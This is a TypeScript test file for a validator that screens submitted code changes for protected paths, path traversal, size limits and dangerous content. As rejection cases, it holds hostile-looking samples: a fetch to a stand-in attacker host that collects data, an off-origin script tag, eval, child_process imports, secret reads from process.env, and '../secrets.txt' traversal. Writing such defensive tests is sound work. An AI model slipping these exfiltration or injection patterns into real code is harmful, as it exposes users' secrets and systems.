import { createHash } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import { buildIdOf, digestOfFiles, normalizePath } from '@/lib/openship/change'
import type { OpenshipFile } from '@/lib/openship/manifest'
import { validateChange } from '@/lib/openship/validate'

const file = (path: string, content: string): OpenshipFile => ({
  path,
  size: Buffer.byteLength(content),
  sha256: createHash('sha256').update(content).digest('hex'),
  encoding: 'utf-8',
  mediaType: 'text/plain; charset=utf-8',
  type: 'file',
})

const BASE: OpenshipFile[] = [
  file('app/page.tsx', 'export default () => <p>hello</p>\n'),
  file('components/Header.tsx', 'export const Header = () => <header />\n'),
  file('app/api/draft/route.ts', 'export const GET = () => new Response()\n'),
  file('lib/auth-user.ts', 'export const getAuthenticatedUser = () => null\n'),
  file('package.json', '{ "name": "memorioso" }\n'),
  file('public/logo.png', 'not really a png'),
]

const BASE_DIGEST = digestOfFiles(BASE)

const submit = (files: Record<string, { encoding: string; content: string } | null>) =>
  validateChange(
    {
      openship: '1.0',
      base: BASE_DIGEST,
      title: 'A change',
      intent: 'This exists so the validator has something with a plausible stated intent to read.',
      files: files as never,
    },
    { base: BASE, baseDigest: BASE_DIGEST, mediaTypeOf: () => 'text/plain; charset=utf-8' }
  )

const utf8 = (content: string) => ({ encoding: 'utf-8', content })

const rulesOf = (result: ReturnType<typeof submit>) =>
  result.ok ? [] : result.violations.map((violation) => violation.rule)

describe('validateChange', () => {
  it('accepts a change to a writable path', () => {
    const result = submit({ 'app/page.tsx': utf8('export default () => <p>goodbye</p>\n') })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.changedPaths).toEqual(['app/page.tsx'])
    expect(result.tree.digest).not.toBe(BASE_DIGEST)
    expect(result.tree.buildId).toHaveLength(12)
  })

  it('derives the buildId from the resulting tree, not the submission', () => {
    const content = 'export default () => <p>same</p>\n'
    const first = submit({ 'app/page.tsx': utf8(content) })
    const second = validateChange(
      {
        openship: '1.0',
        base: BASE_DIGEST,
        // A different author, title, and intent for byte-identical output.
        title: 'Completely different title',
        intent: 'A different description of what is, in the end, exactly the same resulting tree.',
        files: { 'app/page.tsx': utf8(content) } as never,
      },
      { base: BASE, baseDigest: BASE_DIGEST, mediaTypeOf: () => 'text/plain; charset=utf-8' }
    )
    expect(first.ok && second.ok).toBe(true)
    if (!first.ok || !second.ok) return
    expect(first.tree.buildId).toBe(second.tree.buildId)
  })

  it('rejects a stale base digest so a change never applies to an unread tree', () => {
    const result = validateChange(
      {
        openship: '1.0',
        base: 'sha256:0000',
        title: 'A change',
        intent: 'Long enough to pass the intent length rule on its own merits.',
        files: { 'app/page.tsx': utf8('x') } as never,
      },
      { base: BASE, baseDigest: BASE_DIGEST, mediaTypeOf: () => 'text/plain; charset=utf-8' }
    )
    expect(rulesOf(result)).toContain('base')
  })

  describe('protected paths', () => {
    it.each([
      ['app/api/draft/route.ts', 'an API route'],
      ['lib/auth-user.ts', 'authentication'],
      ['package.json', 'the dependency manifest'],
      ['lib/openship/policy.ts', 'the policy that judges the submission'],
      ['lib/openship/validate.ts', 'the validator itself'],
      ['OPENSHIP-CHANGES.md', 'the rules'],
      ['.env.local', 'secrets'],
      ['next.config.ts', 'build configuration'],
      ['scripts/openship-worker.mjs', 'the build pipeline'],
      ['middleware.ts', 'request interception'],
    ])('rejects %s (%s)', (path) => {
      expect(rulesOf(submit({ [path]: utf8('anything') }))).toContain('protected')
    })

    it('rejects a new file at a protected path that does not exist yet', () => {
      expect(rulesOf(submit({ 'app/api/evil/route.ts': utf8('export const GET = () => {}') }))).toContain(
        'protected'
      )
    })

    it('rejects a protected path reached through a different extension', () => {
      // app/api/draft/route.ts is protected; route.mjs resolves to the same route.
      expect(rulesOf(submit({ 'app/api/draft/route.mjs': utf8('export const GET = () => {}') }))).toContain(
        'protected'
      )
    })

    it('rejects a path outside the writable set even when no rule names it', () => {
      expect(rulesOf(submit({ 'docs/notes.md': utf8('hello') }))).toContain('writable')
    })
  })

  describe('path shapes', () => {
    it.each([
      'app/../lib/auth-user.ts',
      '/app/page.tsx',
      'app/./page.tsx',
      'app\\page.tsx',
      '../secrets.txt',
    ])('rejects %s', (path) => {
      expect(rulesOf(submit({ [path]: utf8('x') }))).toContain('shape')
    })

    it('normalizePath returns null for traversal and accepts ordinary paths', () => {
      expect(normalizePath('app/../lib/x.ts')).toBeNull()
      expect(normalizePath('app/a/[authorId]/page.tsx')).toBe('app/a/[authorId]/page.tsx')
      expect(normalizePath('app/(site)/page.tsx')).toBe('app/(site)/page.tsx')
    })
  })

  describe('content rules', () => {
    const cases: [string, string][] = [
      ['Dynamic evaluation', 'const run = eval("1 + 1")'],
      ['Dynamic evaluation', 'const f = new Function("return 1")'],
      ['Node built-ins', "import { execSync } from 'node:child_process'"],
      ['Node built-ins', "import { readFileSync } from 'fs'"],
      ['Environment access', 'const secret = process.env.SESSION_SECRET'],
      ['Environment access', 'send(process.env)'],
      ['Server actions', "'use server'"],
      ['Raw HTML injection', 'return <div dangerouslySetInnerHTML={{ __html: input }} />'],
      ['Off-origin subresources', '<script src="https://evil.example/x.js"></script>'],
      ['Off-origin requests', 'fetch("https://evil.example/collect")'],
      ['Obfuscation', 'const s = String.fromCharCode(101, 118)'],
      ['Obfuscation', 'const s = atob(payload)'],
      ['Credential shapes', 'const url = "postgresql://user:hunter2@host/db"'],
      ['Credential shapes', 'const auth = "Bearer sk-abcdefghijklmnopqrstuvwxyz"'],
    ]

    it.each(cases)('rejects %s: %s', (rule, source) => {
      expect(rulesOf(submit({ 'app/page.tsx': utf8(source) }))).toContain(rule)
    })

    it('allows reading a NEXT_PUBLIC_ variable, which is already in the client bundle', () => {
      const result = submit({ 'app/page.tsx': utf8('const url = process.env.NEXT_PUBLIC_APP_URL\n') })
      expect(result.ok).toBe(true)
    })

    it('allows a same-origin relative fetch', () => {
      const result = submit({ 'app/page.tsx': utf8('const data = await fetch("/api/x")\n') })
      expect(result.ok).toBe(true)
    })

    it('scans SVG, because an SVG is a script host', () => {
      expect(
        rulesOf(submit({ 'public/art.svg': utf8('<svg><script>eval("x")</script></svg>') }))
      ).toContain('Dynamic evaluation')
    })

    it('does not scan a binary asset', () => {
      const png = { encoding: 'base64', content: Buffer.from('eval(1)').toString('base64') }
      expect(submit({ 'public/art.png': png }).ok).toBe(true)
    })
  })

  describe('limits and the tree', () => {
    it('rejects a file over the per-file byte limit', () => {
      const huge = utf8('x'.repeat(256 * 1024 + 1))
      expect(rulesOf(submit({ 'app/page.tsx': huge }))).toContain('bytesPerFile')
    })

    it('rejects more files than the per-change limit', () => {
      const files = Object.fromEntries(
        Array.from({ length: 41 }, (_, index) => [`app/p${index}/page.tsx`, utf8('export default () => null')])
      )
      expect(rulesOf(submit(files))).toContain('filesPerChange')
    })

    it('rejects deleting a file that is not in the base tree', () => {
      expect(rulesOf(submit({ 'app/missing.tsx': null }))).toContain('deletion')
    })

    it('applies a deletion and drops the path from the resulting tree', () => {
      const result = submit({ 'components/Header.tsx': null })
      expect(result.ok).toBe(true)
      if (!result.ok) return
      expect(result.tree.files.map((entry) => entry.path)).not.toContain('components/Header.tsx')
    })

    it('rejects a change that resolves to the base tree', () => {
      const unchanged = utf8('export default () => <p>hello</p>\n')
      expect(rulesOf(submit({ 'app/page.tsx': unchanged }))).toContain('noop')
    })

    it('rejects content that does not decode as the declared encoding', () => {
      const bad = { encoding: 'base64', content: 'not valid base64 !!!' }
      expect(rulesOf(submit({ 'app/page.tsx': bad }))).toContain('encoding')
    })

    it('rejects an unknown encoding', () => {
      expect(rulesOf(submit({ 'app/page.tsx': { encoding: 'hex', content: 'ff' } }))).toContain('encoding')
    })
  })

  describe('the envelope', () => {
    const envelope = (patch: Record<string, unknown>) =>
      validateChange(
        {
          openship: '1.0',
          base: BASE_DIGEST,
          title: 'A change',
          intent: 'A description long enough to satisfy the minimum intent length.',
          files: { 'app/page.tsx': utf8('export default () => null\n') } as never,
          ...patch,
        },
        { base: BASE, baseDigest: BASE_DIGEST, mediaTypeOf: () => 'text/plain; charset=utf-8' }
      )

    it('requires a stated intent of substance', () => {
      expect(rulesOf(envelope({ intent: 'fix' }))).toContain('intent')
    })

    it('requires a title', () => {
      expect(rulesOf(envelope({ title: '   ' }))).toContain('title')
    })

    it('requires the protocol version', () => {
      expect(rulesOf(envelope({ openship: '2.0' }))).toContain('openship')
    })

    it('requires at least one changed file', () => {
      expect(rulesOf(envelope({ files: {} }))).toContain('files')
    })
  })
})

describe('digestOfFiles', () => {
  it('matches the definition in OPENSHIP.md', () => {
    const expected =
      'sha256:' +
      createHash('sha256')
        .update(
          [...BASE]
            .sort((left, right) => (left.path < right.path ? -1 : 1))
            .map((entry) => `${entry.path}\0${entry.sha256}\n`)
            .join('')
        )
        .digest('hex')
    expect(BASE_DIGEST).toBe(expected)
  })

  it('is independent of the order files are supplied in', () => {
    expect(digestOfFiles([...BASE].reverse())).toBe(BASE_DIGEST)
  })

  it('gives buildIdOf a twelve character hex prefix', () => {
    expect(buildIdOf(BASE_DIGEST)).toBe(BASE_DIGEST.slice(7, 19))
  })
})
